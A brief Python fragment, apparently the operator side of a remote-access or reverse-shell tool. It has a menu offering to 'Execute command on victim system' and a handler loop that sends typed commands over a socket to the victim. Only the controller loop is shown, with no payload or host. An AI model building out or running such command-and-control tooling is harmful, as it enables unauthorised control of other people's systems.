def options():
    print("(1) Execute command on victim system")

def handler(sock):
    print("[+] Handler has started")
    while True:
        User_input=input("What do you want to do: ")
        sock.send_data(User_input)
        if User_input=="exit":
            print("[+] Exiting handler")
            break